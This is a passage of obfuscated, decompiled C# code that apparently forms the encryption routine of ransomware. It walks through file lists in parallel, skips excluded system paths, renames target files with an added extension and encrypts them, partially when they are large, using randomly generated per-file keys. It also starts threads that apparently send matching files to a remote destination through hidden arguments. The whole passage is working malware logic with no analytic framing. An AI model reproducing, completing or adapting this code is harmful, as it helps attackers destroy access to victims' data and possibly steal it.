							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107117053))
					{
						dTKSKVKPkMuy(item, item + string_2, cIuCDrbwXuOW);
					}
					else
					{
						dTKSKVKPkMuy(item, item + getString_0(107117048), cIuCDrbwXuOW);
					}
				}
				catch (Exception)
				{
				}
				IL_0457:;
			}
		}
	}

	public static void YaHDZBHivPOf(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		TxvmYnegcEEXP.pFmMbBUFsGam CS_0024_003C_003E8__locals0 = new TxvmYnegcEEXP();
		CS_0024_003C_003E8__locals0.NkwuoikPHxefPg = list_0;
		CS_0024_003C_003E8__locals0.smwDoAVKEY = string_1;
		CS_0024_003C_003E8__locals0.JLhEdrGQmnkgx = string_2;
		CS_0024_003C_003E8__locals0.zlRieKkFzeh = string_3;
		CS_0024_003C_003E8__locals0.GjQUDYPqDPYd = new List<string> { getString_0(107087972) };
		if (seHvuluwnSdiPD == getString_0(107396882))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.NkwuoikPHxefPg)
				{
					if (!item.Contains(TxvmYnegcEEXP.getString_0(107088124)) && !item.Contains(TxvmYnegcEEXP.getString_0(107088067)) && !item.Contains(TxvmYnegcEEXP.getString_0(107088034)) && !item.ToLower().Contains(TxvmYnegcEEXP.getString_0(107088049)) && !item.ToLower().Contains(TxvmYnegcEEXP.getString_0(107088004)) && !item.Contains(TxvmYnegcEEXP.getString_0(107088491)) && !item.Contains(TxvmYnegcEEXP.getString_0(107088502)) && !item.ToLower().Contains(TxvmYnegcEEXP.getString_0(107088453)) && !item.ToLower().Contains(TxvmYnegcEEXP.getString_0(107088472)) && !item.ToLower().Contains(TxvmYnegcEEXP.getString_0(107088435)) && !item.ToLower().Contains(TxvmYnegcEEXP.getString_0(107088394)) && !item.ToLower().Contains(TxvmYnegcEEXP.getString_0(107088409)) && !item.ToLower().Contains(TxvmYnegcEEXP.getString_0(107088383)) && !item.ToLower().Contains(TxvmYnegcEEXP.getString_0(107088330)) && !item.Contains(TxvmYnegcEEXP.getString_0(107088337)) && !item.Contains(TxvmYnegcEEXP.getString_0(107088320)) && !item.Contains(TxvmYnegcEEXP.getString_0(107088271)) && !item.Contains(TxvmYnegcEEXP.getString_0(107088286)) && !item.Contains(TxvmYnegcEEXP.getString_0(107087725)) && !item.Contains(TxvmYnegcEEXP.getString_0(107087740)) && !item.Contains(TxvmYnegcEEXP.getString_0(107087691)) && !item.Contains(TxvmYnegcEEXP.getString_0(107087706)) && !item.Contains(TxvmYnegcEEXP.getString_0(107087661)) && !item.Contains(TxvmYnegcEEXP.getString_0(107087672)) && !item.ToLower().Contains(TxvmYnegcEEXP.getString_0(107087627)) && !item.ToLower().Contains(TxvmYnegcEEXP.getString_0(107087646)) && !item.ToLower().Contains(TxvmYnegcEEXP.getString_0(107087597)) && !item.ToLower().Contains(TxvmYnegcEEXP.getString_0(107087612)) && !item.Contains(ZszvXPTYjBtgjF(TxvmYnegcEEXP.getString_0(107087563))) && !item.Contains(TxvmYnegcEEXP.getString_0(107087570)) && !item.Contains(TxvmYnegcEEXP.getString_0(107087525)) && !item.Contains(TxvmYnegcEEXP.getString_0(107087540)) && !item.EndsWith(CS_0024_003C_003E8__locals0.smwDoAVKEY) && !item.EndsWith(TxvmYnegcEEXP.getString_0(107087515)) && !item.EndsWith(TxvmYnegcEEXP.getString_0(107087510)) && !item.EndsWith(TxvmYnegcEEXP.getString_0(107087505)) && !item.EndsWith(TxvmYnegcEEXP.getString_0(107087980)) && !item.Contains(TxvmYnegcEEXP.getString_0(107087975)) && !item.Contains(kkipsSsrGYdH) && !item.Contains(YPtXSOBdFjEyjx) && !item.Contains(wtdIqahxTNLZTaxN))
					{
						if (CS_0024_003C_003E8__locals0.JLhEdrGQmnkgx.Length != 0)
						{
							string[] jLhEdrGQmnkgx2 = CS_0024_003C_003E8__locals0.JLhEdrGQmnkgx;
							int num2 = 0;
							while (num2 < jLhEdrGQmnkgx2.Length)
							{
								string value2 = jLhEdrGQmnkgx2[num2];
								if (!item.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_0bd3;
							}
						}
						try
						{
							if (item.EndsWith(CS_0024_003C_003E8__locals0.smwDoAVKEY))
							{
								goto IL_0bd3;
							}
						}
						catch (Exception)
						{
							goto IL_0bd3;
						}
						if (item.EndsWith(string_0) && !iqVERQUhagNsiaC.Contains(item))
						{
							if (gZQfvzYpbFm == TxvmYnegcEEXP.getString_0(107396927))
							{
								try
								{
									if (LKzunSqPvQl.OqOYRyhEkO(item))
									{
										LKzunSqPvQl.jdGybWbavTdA(item);
									}
								}
								catch
								{
								}
							}
							iqVERQUhagNsiaC.Add(item);
							if (!LJCJcQbJapSHJR.Contains(Path.GetDirectoryName(item)))
							{
								LJCJcQbJapSHJR.Add(Path.GetDirectoryName(item));
							}
							bvXmiHFimEQvc(item);
							try
							{
								try
								{
									if (new FileInfo(item).Length != 0L)
									{
										goto end_IL_0537;
									}
									goto end_IL_0537_2;
									end_IL_0537:;
								}
								catch (Exception ex12)
								{
									if (WUCUbinjeq)
									{
										try
										{
											File.AppendAllText(YPtXSOBdFjEyjx, TxvmYnegcEEXP.getString_0(107116801) + item + TxvmYnegcEEXP.getString_0(107200071) + ex12.Message + TxvmYnegcEEXP.getString_0(107396273));
										}
										catch (Exception)
										{
										}
									}
									uKBVRzIpOhGoBvvo++;
									goto end_IL_0537_2;
								}
								if (mDoYpgRrDTVMHT == TxvmYnegcEEXP.getString_0(107396927) && new FileInfo(item).Length > Convert.ToInt32(lpATBSWKaW) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.GjQUDYPqDPYd.Contains(string_0))
								{
									CS_0024_003C_003E8__locals0 = new TxvmYnegcEEXP.jLsWkoDNXB();
									CS_0024_003C_003E8__locals0.cuOejHWGxARa = CS_0024_003C_003E8__locals0;
									try
									{
										if (CS_0024_003C_003E8__locals0.smwDoAVKEY != TxvmYnegcEEXP.getString_0(107117071))
										{
											if (SWTAoziGpJs)
											{
												CS_0024_003C_003E8__locals0.smwDoAVKEY = oADcMioEnFbvkP + CS_0024_003C_003E8__locals0.smwDoAVKEY;
											}
											File.Move(item, item + CS_0024_003C_003E8__locals0.smwDoAVKEY);
										}
									}
									catch (Exception ex14)
									{
										if (WUCUbinjeq)
										{
											try
											{
												File.AppendAllText(YPtXSOBdFjEyjx, TxvmYnegcEEXP.getString_0(107116801) + item + TxvmYnegcEEXP.getString_0(107200010) + ex14.Message + TxvmYnegcEEXP.getString_0(107396273));
											}
											catch (Exception)
											{
											}
										}
										uKBVRzIpOhGoBvvo++;
										goto end_IL_0537_2;
									}
									CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI = TxvmYnegcEEXP.getString_0(107087990);
									if (CS_0024_003C_003E8__locals0.smwDoAVKEY != TxvmYnegcEEXP.getString_0(107117071))
									{
										CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI = item + CS_0024_003C_003E8__locals0.smwDoAVKEY;
									}
									else
									{
										CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI = item;
									}
									if (pAvlEUMGUOUVcdb == TxvmYnegcEEXP.getString_0(107396927))
									{
										Thread thread2 = new Thread((ThreadStart)delegate
										{
											foreach (string item2 in RrzUCivKfrsaJ)
											{
												if (CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.cuOejHWGxARa.smwDoAVKEY) && ARdYTzaLyCQej == TxvmYnegcEEXP.jLsWkoDNXB.getString_0(107396930))
												{
													if (Convert.ToInt32(zxDCvygXmLZs) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI).Length)
													{
														try
														{
															GtRYKNkRmbf.WWRIlNqXKavKj(TxvmYnegcEEXP.jLsWkoDNXB.getString_0(107089469), TxvmYnegcEEXP.jLsWkoDNXB.getString_0(107089464), TxvmYnegcEEXP.jLsWkoDNXB.getString_0(107089419), CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI);
														}
														catch
														{
														}
													}
												}
												else if (CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI.ToLower().EndsWith(item2) && ARdYTzaLyCQej == TxvmYnegcEEXP.jLsWkoDNXB.getString_0(107396903))
												{
													try
													{
														GtRYKNkRmbf.WWRIlNqXKavKj(TxvmYnegcEEXP.jLsWkoDNXB.getString_0(107089469), TxvmYnegcEEXP.jLsWkoDNXB.getString_0(107089464), TxvmYnegcEEXP.jLsWkoDNXB.getString_0(107089419), CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI);
													}
													catch
													{
													}
												}
											}
										});
										thread2.Priority = ThreadPriority.Normal;
										thread2.IsBackground = false;
										thread2.Start();
									}
									string text3 = NZopcmHTCiMQzV.uWnqKeXVtnZBRi(32);
									string s3 = JsvGUDXDxegb.IZZvLHDYDcwVFv(text3);
									byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
									if (POQJbfIxsobkq == TxvmYnegcEEXP.getString_0(107396900))
									{
										byte[] array2 = null;
										byte[] byte_2 = UMakmguwDziAz.DfejPHmIhOnY(CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI, Convert.ToInt32(lpATBSWKaW) * 1024 * 1024);
										UMakmguwDziAz.nkwBxgmWNRASp(fWRwXzgCAjjaTG: (!qZXDIsTpDUXR) ? (kzxgomJEqSw ? UMakmguwDziAz.YfzRuKIVSlIggFhc(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : UMakmguwDziAz.YfzRuKIVSlIggFhc(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.zlRieKkFzeh), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (kzxgomJEqSw ? lvPnQGmwQvcsCNgQ.RRycjAChOoCA(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : lvPnQGmwQvcsCNgQ.RRycjAChOoCA(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.zlRieKkFzeh), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), sNrLziMcVOrPcU: CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI, afrhZVQdJhNaNnw: bytes3);
									}
									else if (!kzxgomJEqSw)
									{
										fUfTmnKzHcpx.epfACCRTlqVGS(CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI, lpATBSWKaW, CS_0024_003C_003E8__locals0.zlRieKkFzeh);
									}
									else
									{
										fUfTmnKzHcpx.epfACCRTlqVGS(CS_0024_003C_003E8__locals0.swqZlkLBjRbZRI, lpATBSWKaW, text3, bytes3);
									}
								}
								else
								{
									if (SWTAoziGpJs)
									{
										CS_0024_003C_003E8__locals0.smwDoAVKEY = oADcMioEnFbvkP + CS_0024_003C_003E8__locals0.smwDoAVKEY;
									}
									string text4 = NZopcmHTCiMQzV.uWnqKeXVtnZBRi(32);
									string s4 = JsvGUDXDxegb.IZZvLHDYDcwVFv(text4);
									byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
									if (CS_0024_003C_003E8__locals0.smwDoAVKEY != TxvmYnegcEEXP.getString_0(107117071))
									{
										if (!tJrulPsPKZ)
										{
											if (!kzxgomJEqSw)
											{
												NvWUfuaAWdwvhRC(item, item + CS_0024_003C_003E8__locals0.smwDoAVKEY, cIuCDrbwXuOW);
											}
											else
											{
												NvWUfuaAWdwvhRC(item, item + CS_0024_003C_003E8__locals0.smwDoAVKEY, Encoding.ASCII.GetBytes(text4));
											}
										}
										else
										{
											try
											{
												if (!kzxgomJEqSw)
												{
													kJPieacjYGSQl(item, item + CS_0024_003C_003E8__locals0.smwDoAVKEY, cIuCDrbwXuOW);
												}
												else
												{
													kJPieacjYGSQl(item, item + CS_0024_003C_003E8__locals0.smwDoAVKEY, Encoding.ASCII.GetBytes(text4));
												}
											}
											catch (Exception ex16)
											{
												if (WUCUbinjeq)
												{
													try
													{
														File.AppendAllText(YPtXSOBdFjEyjx, TxvmYnegcEEXP.getString_0(107116801) + item + TxvmYnegcEEXP.getString_0(107117057) + ex16.Message + TxvmYnegcEEXP.getString_0(107396273));
													}
													catch (Exception)
													{
													}
												}
												uKBVRzIpOhGoBvvo++;
												goto end_IL_0537_2;
											}
										}
									}
									else if (!tJrulPsPKZ)
									{
										if (!kzxgomJEqSw)
										{
											NvWUfuaAWdwvhRC(item, item + TxvmYnegcEEXP.getString_0(107117066), cIuCDrbwXuOW);
										}
										else
										{
											NvWUfuaAWdwvhRC(item, item + TxvmYnegcEEXP.getString_0(107117066), Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!kzxgomJEqSw)
											{
												kJPieacjYGSQl(item, item, cIuCDrbwXuOW);
											}
											else
											{
												kJPieacjYGSQl(item, item, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex18)
										{
											if (WUCUbinjeq)
											{
												try
												{
													File.AppendAllText(YPtXSOBdFjEyjx, TxvmYnegcEEXP.getString_0(107116801) + item + TxvmYnegcEEXP.getString_0(107117057) + ex18.Message + TxvmYnegcEEXP.getString_0(107396273));
												}
												catch (Exception)
												{
												}
											}
											uKBVRzIpOhGoBvvo++;
											goto end_IL_0537_2;
										}
									}
									if (kzxgomJEqSw)
									{
										if (CS_0024_003C_003E8__locals0.smwDoAVKEY != TxvmYnegcEEXP.getString_0(107117071))
										{
											cSThTETOguBcBoOS(item + CS_0024_003C_003E8__locals0.smwDoAVKEY, bytes4);
										}
										else
										{
											cSThTETOguBcBoOS(item, bytes4);
										}
									}
								}
								goto IL_0bd3;
								end_IL_0537_2:;
							}
							catch (Exception)
							{
								goto IL_0bd3;
							}
						}
					}
					continue;
					IL_0bd3:
					CS_0024_003C_003E8__locals0.NkwuoikPHxefPg.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.NkwuoikPHxefPg, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new TxvmYnegcEEXP.pFmMbBUFsGam();
			CS_0024_003C_003E8__locals0.cuOejHWGxARa = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt = string_0;
			if (!CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(TxvmYnegcEEXP.getString_0(107088124)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(TxvmYnegcEEXP.getString_0(107088067)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(TxvmYnegcEEXP.getString_0(107088034)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(TxvmYnegcEEXP.getString_0(107088049)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(TxvmYnegcEEXP.getString_0(107088004)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(TxvmYnegcEEXP.getString_0(107088491)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(TxvmYnegcEEXP.getString_0(107088502)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(TxvmYnegcEEXP.getString_0(107088453)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(TxvmYnegcEEXP.getString_0(107088472)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(TxvmYnegcEEXP.getString_0(107088435)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(TxvmYnegcEEXP.getString_0(107088394)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(TxvmYnegcEEXP.getString_0(107088409)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(TxvmYnegcEEXP.getString_0(107088383)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(TxvmYnegcEEXP.getString_0(107088330)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(TxvmYnegcEEXP.getString_0(107088337)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(TxvmYnegcEEXP.getString_0(107088320)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(TxvmYnegcEEXP.getString_0(107088271)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(TxvmYnegcEEXP.getString_0(107088286)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(TxvmYnegcEEXP.getString_0(107087725)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(TxvmYnegcEEXP.getString_0(107087740)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(TxvmYnegcEEXP.getString_0(107087691)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(TxvmYnegcEEXP.getString_0(107087706)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(TxvmYnegcEEXP.getString_0(107087661)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(TxvmYnegcEEXP.getString_0(107087672)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(TxvmYnegcEEXP.getString_0(107087627)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(TxvmYnegcEEXP.getString_0(107087646)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(TxvmYnegcEEXP.getString_0(107087597)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().Contains(TxvmYnegcEEXP.getString_0(107087612)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(ZszvXPTYjBtgjF(TxvmYnegcEEXP.getString_0(107087563))) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(TxvmYnegcEEXP.getString_0(107087570)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(TxvmYnegcEEXP.getString_0(107087525)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(TxvmYnegcEEXP.getString_0(107087540)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.EndsWith(CS_0024_003C_003E8__locals0.smwDoAVKEY) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.EndsWith(TxvmYnegcEEXP.getString_0(107087515)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.EndsWith(TxvmYnegcEEXP.getString_0(107087510)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.EndsWith(TxvmYnegcEEXP.getString_0(107087505)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.EndsWith(TxvmYnegcEEXP.getString_0(107087980)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(TxvmYnegcEEXP.getString_0(107087975)) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(kkipsSsrGYdH) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(YPtXSOBdFjEyjx) && !CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.Contains(wtdIqahxTNLZTaxN))
			{
				if (CS_0024_003C_003E8__locals0.JLhEdrGQmnkgx.Length != 0)
				{
					string[] jLhEdrGQmnkgx = CS_0024_003C_003E8__locals0.JLhEdrGQmnkgx;
					int num = 0;
					while (num < jLhEdrGQmnkgx.Length)
					{
						string value = jLhEdrGQmnkgx[num];
						if (!CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0d56;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.EndsWith(CS_0024_003C_003E8__locals0.smwDoAVKEY))
					{
						goto IL_0d56;
					}
				}
				catch (Exception)
				{
					goto IL_0d56;
				}
				if (!iqVERQUhagNsiaC.Contains(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt))
				{
					if (gZQfvzYpbFm == TxvmYnegcEEXP.getString_0(107396927))
					{
						try
						{
							if (LKzunSqPvQl.OqOYRyhEkO(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt))
							{
								LKzunSqPvQl.jdGybWbavTdA(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt);
							}
						}
						catch
						{
						}
					}
					iqVERQUhagNsiaC.Add(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt);
					if (!LJCJcQbJapSHJR.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt)))
					{
						LJCJcQbJapSHJR.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt));
					}
					bvXmiHFimEQvc(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt);
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt).Length != 0L)
							{
								goto end_IL_0656;
							}
							goto end_IL_0656_2;
							end_IL_0656:;
						}
						catch (Exception ex2)
						{
							if (WUCUbinjeq)
							{
								try
								{
									File.AppendAllText(YPtXSOBdFjEyjx, TxvmYnegcEEXP.getString_0(107116801) + CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + TxvmYnegcEEXP.getString_0(107200071) + ex2.Message + TxvmYnegcEEXP.getString_0(107396273));
								}
								catch (Exception)
								{
								}
							}
							uKBVRzIpOhGoBvvo++;
							goto end_IL_0656_2;
						}
						if (mDoYpgRrDTVMHT == TxvmYnegcEEXP.getString_0(107396927) && new FileInfo(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt).Length > Convert.ToInt32(lpATBSWKaW) * 1024 * 1024)
						{
							try
							{
								if (CS_0024_003C_003E8__locals0.smwDoAVKEY != TxvmYnegcEEXP.getString_0(107117071))
								{
									if (SWTAoziGpJs)
									{
										CS_0024_003C_003E8__locals0.smwDoAVKEY = oADcMioEnFbvkP + CS_0024_003C_003E8__locals0.smwDoAVKEY;
									}
									File.Move(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + CS_0024_003C_003E8__locals0.smwDoAVKEY);
								}
							}
							catch (Exception ex4)
							{
								if (WUCUbinjeq)
								{
									try
									{
										File.AppendAllText(YPtXSOBdFjEyjx, TxvmYnegcEEXP.getString_0(107116801) + CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + TxvmYnegcEEXP.getString_0(107200010) + ex4.Message + TxvmYnegcEEXP.getString_0(107396273));
									}
									catch (Exception)
									{
									}
								}
								uKBVRzIpOhGoBvvo++;
								return;
							}
							if (CS_0024_003C_003E8__locals0.smwDoAVKEY != TxvmYnegcEEXP.getString_0(107117071))
							{
								CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt += CS_0024_003C_003E8__locals0.smwDoAVKEY;
							}
							if (pAvlEUMGUOUVcdb == TxvmYnegcEEXP.getString_0(107396927))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item3 in RrzUCivKfrsaJ)
									{
										if (CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.cuOejHWGxARa.smwDoAVKEY) && ARdYTzaLyCQej == TxvmYnegcEEXP.pFmMbBUFsGam.getString_0(107396933))
										{
											if (Convert.ToInt32(zxDCvygXmLZs) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt).Length)
											{
												try
												{
													GtRYKNkRmbf.WWRIlNqXKavKj(TxvmYnegcEEXP.pFmMbBUFsGam.getString_0(107089472), TxvmYnegcEEXP.pFmMbBUFsGam.getString_0(107089467), TxvmYnegcEEXP.pFmMbBUFsGam.getString_0(107089422), CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt.ToLower().EndsWith(item3) && ARdYTzaLyCQej == TxvmYnegcEEXP.pFmMbBUFsGam.getString_0(107396906))
										{
											try
											{
												GtRYKNkRmbf.WWRIlNqXKavKj(TxvmYnegcEEXP.pFmMbBUFsGam.getString_0(107089472), TxvmYnegcEEXP.pFmMbBUFsGam.getString_0(107089467), TxvmYnegcEEXP.pFmMbBUFsGam.getString_0(107089422), CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = NZopcmHTCiMQzV.uWnqKeXVtnZBRi(32);
							string s = JsvGUDXDxegb.IZZvLHDYDcwVFv(text);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (POQJbfIxsobkq == TxvmYnegcEEXP.getString_0(107396900))
							{
								byte[] array = null;
								byte[] byte_ = UMakmguwDziAz.DfejPHmIhOnY(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, Convert.ToInt32(lpATBSWKaW) * 1024 * 1024);
								UMakmguwDziAz.nkwBxgmWNRASp(fWRwXzgCAjjaTG: (!qZXDIsTpDUXR) ? (kzxgomJEqSw ? UMakmguwDziAz.YfzRuKIVSlIggFhc(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : UMakmguwDziAz.YfzRuKIVSlIggFhc(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.zlRieKkFzeh), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (kzxgomJEqSw ? lvPnQGmwQvcsCNgQ.RRycjAChOoCA(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : lvPnQGmwQvcsCNgQ.RRycjAChOoCA(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.zlRieKkFzeh), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), sNrLziMcVOrPcU: CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, afrhZVQdJhNaNnw: bytes);
							}
							else if (!kzxgomJEqSw)
							{
								fUfTmnKzHcpx.epfACCRTlqVGS(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, lpATBSWKaW, CS_0024_003C_003E8__locals0.zlRieKkFzeh);
							}
							else
							{
								fUfTmnKzHcpx.epfACCRTlqVGS(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, lpATBSWKaW, text, bytes);
							}
						}
						else
						{
							if (SWTAoziGpJs)
							{
								CS_0024_003C_003E8__locals0.smwDoAVKEY = oADcMioEnFbvkP + CS_0024_003C_003E8__locals0.smwDoAVKEY;
							}
							string text2 = NZopcmHTCiMQzV.uWnqKeXVtnZBRi(32);
							string s2 = JsvGUDXDxegb.IZZvLHDYDcwVFv(text2);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (CS_0024_003C_003E8__locals0.smwDoAVKEY != TxvmYnegcEEXP.getString_0(107117071))
							{
								if (!tJrulPsPKZ)
								{
									if (!kzxgomJEqSw)
									{
										NvWUfuaAWdwvhRC(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + CS_0024_003C_003E8__locals0.smwDoAVKEY, cIuCDrbwXuOW);
									}
									else
									{
										NvWUfuaAWdwvhRC(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + CS_0024_003C_003E8__locals0.smwDoAVKEY, Encoding.ASCII.GetBytes(text2));
									}
								}
								else
								{
									try
									{
										if (!kzxgomJEqSw)
										{
											kJPieacjYGSQl(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + CS_0024_003C_003E8__locals0.smwDoAVKEY, cIuCDrbwXuOW);
										}
										else
										{
											kJPieacjYGSQl(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + CS_0024_003C_003E8__locals0.smwDoAVKEY, Encoding.ASCII.GetBytes(text2));
										}
									}
									catch (Exception ex6)
									{
										if (WUCUbinjeq)
										{
											try
											{
												File.AppendAllText(YPtXSOBdFjEyjx, TxvmYnegcEEXP.getString_0(107116801) + CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + TxvmYnegcEEXP.getString_0(107117057) + ex6.Message + TxvmYnegcEEXP.getString_0(107396273));
											}
											catch (Exception)
											{
											}
										}
										uKBVRzIpOhGoBvvo++;
										return;
									}
								}
							}
							else if (!tJrulPsPKZ)
							{
								if (!kzxgomJEqSw)
								{
									NvWUfuaAWdwvhRC(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + TxvmYnegcEEXP.getString_0(107117066), cIuCDrbwXuOW);
								}
								else
								{
									NvWUfuaAWdwvhRC(CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt, CS_0024_003C_003E8__locals0.uPbVWEenEqRDPeByt + TxvmYnegcEEXP.getString_0(107117066), Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!kzxgomJEqSw)
									{
